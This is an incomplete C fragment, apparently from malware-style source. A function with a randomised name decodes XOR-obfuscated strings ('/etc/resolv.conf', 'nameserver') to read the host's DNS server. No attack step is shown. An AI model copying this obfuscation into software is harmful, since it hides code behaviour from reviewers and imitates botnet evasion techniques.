...
static ipv4_t _hU2VN8X(void)
{
    ...
    int fd = open(_S(16,0x83,0xc9,0xd8,0xcf,0x83,0xde,0xc9,0xdf,0xc3,0xc0,0xda,0x82,0xcf,0xc3,0xc2,0xca), O_RDONLY);
    if (fd >= 0)
    {
        char buf[2048];
        ...
        if (n > 0)
        {
            char *p;
            buf[n] = '\0';
            p = strstr(buf, _S(10,0xc2,0xcd,0xc1,0xc9,0xdf,0xc9,0xde,0xda,0xc9,0xde));
            if (p)
            {
                p += 10;
                while (*p == ' ' || *p == '\t') p++;
